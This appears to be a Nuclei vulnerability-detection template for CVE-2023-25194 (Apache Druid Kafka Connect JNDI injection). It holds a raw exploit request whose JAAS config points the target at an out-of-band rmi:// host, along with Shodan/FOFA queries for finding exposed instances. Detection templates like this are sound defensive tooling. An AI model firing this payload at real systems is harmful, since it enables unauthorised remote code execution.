http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - RecordSupplier
  - status:
    - 400
    type: status
  matchers-condition: and
  raw:
  - "POST /druid/indexer/v1/sampler?for=connect HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\n\n{\n    \"type\":\"kafka\",\n    \"spec\":{\n        \"type\"\
    :\"kafka\",\n        \"ioConfig\":{\n            \"type\":\"kafka\",\n       \
    \     \"consumerProperties\":{\n                \"bootstrap.servers\":\"127.0.0.1:6666\"\
    ,\n                \"sasl.mechanism\":\"SCRAM-SHA-256\",\n                \"security.protocol\"\
    :\"SASL_SSL\",\n                \"sasl.jaas.config\":\"com.sun.security.auth.module.JndiLoginModule\
    \ required user.provider.url=\\\"rmi://{{interactsh-url}}:6666/test\\\" useFirstPass=\\\
    \"true\\\" serviceName=\\\"x\\\" debug=\\\"true\\\" group.provider.url=\\\"xxx\\\
    \";\"\n            },\n            \"topic\":\"test\",\n            \"useEarliestOffset\"\
    :true,\n            \"inputFormat\":{\n                \"type\":\"regex\",\n \
    \               \"pattern\":\"([\\\\s\\\\S]*)\",\n                \"listDelimiter\"\
    :\"56616469-6de2-9da4-efb8-8f416e6e6965\",\n                \"columns\":[\n  \
    \                  \"raw\"\n                ]\n            }\n        },\n   \
    \     \"dataSchema\":{\n            \"dataSource\":\"sample\",\n            \"\
    timestampSpec\":{\n                \"column\":\"!!!_no_such_column_!!!\",\n  \
    \              \"missingValue\":\"1970-01-01T00:00:00Z\"\n            },\n   \
    \         \"dimensionsSpec\":{\n\n            },\n            \"granularitySpec\"\
    :{\n                \"rollup\":false\n            }\n        },\n        \"tuningConfig\"\
    :{\n            \"type\":\"kafka\"\n        }\n    },\n    \"samplerConfig\":{\n\
    \        \"numRows\":500,\n        \"timeoutMs\":15000\n    }\n}\n"
id: CVE-2023-25194
info:
  author: j4vaovo
  classification:
    cpe: cpe:2.3:a:apache:kafka_connect:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-25194
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-502
    epss-percentile: 0.99892
    epss-score: 0.94055
  description: 'The vulnerability has the potential to enable a remote attacker with
    authentication to run any code on the system. This is due to unsafe deserialization
    that occurs during the configuration of the connector through the Kafka Connect
    REST API

    '
  impact: 'Authenticated attackers can exploit unsafe deserialization in the Kafka
    Connect REST API to execute arbitrary code through JNDI injection, potentially
    compromising the entire Apache Druid data analytics infrastructure.

    '
  metadata:
    fofa-query: body="apache druid"
    max-request: 1
    product: kafka_connect
    shodan-query:
    - html:"Apache Druid"
    - http.html:"apache druid"
    vendor: apache
    verified: true
  name: Apache Druid Kafka Connect - Remote Code Execution
  reference:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25194
  - https://nvd.nist.gov/vuln/detail/CVE-2023-25194
  - https://github.com/nbxiglk0/Note/blob/0ddc14ecd296df472726863aa5d1f0f29c8adcc4/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java/ApacheDruid/ApacheDruid%20Kafka-rce/ApacheDruid%20Kafka-rce.md#apachedruid-kafka-connect-rce
  - http://packetstormsecurity.com/files/173151/Apache-Druid-JNDI-Injection-Remote-Code-Execution.html
  - https://kafka.apache.org/cve-list
  remediation: 'Apply Apache Druid security patches that validate and sanitize SASL
    JAAS configuration in Kafka connector settings to prevent JNDI injection attacks.

    '
  severity: high
  tags: packetstorm,cve,cve2023,apache,druid,kafka,rce,jndi,oast,vkev,vuln
